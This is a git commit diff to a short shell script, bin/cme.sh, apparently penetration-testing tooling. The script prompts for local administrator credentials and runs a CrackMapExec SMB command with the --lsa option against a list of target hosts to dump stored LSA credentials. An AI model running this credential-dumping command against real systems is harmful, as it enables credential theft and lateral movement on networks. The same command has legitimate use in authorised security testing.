4cd2251ed8fa845ac29f5a7f2702b0a2343d4e4f
nullenc0de <pseekamp@gmail.com>
2019-12-05 13:44:39 -0500

    Update cme.sh

--- bin/cme.sh
+++ bin/cme.sh
@@ -1,7 +1,8 @@
+echo "I want to dump LSA using a local administrator account"
+echo
 #Read in creds to dump from DC
-echo "Enter Domain Username (i.e. Administrator)"
+echo "Enter Local Admin Username (i.e. Administrator)"
 read user
 echo "Enter Password (i.e. Password123!)"
 read pass
-
 cme smb hosts/targets.txt -u $user -p "$pass" -d LOCALHOST --lsa
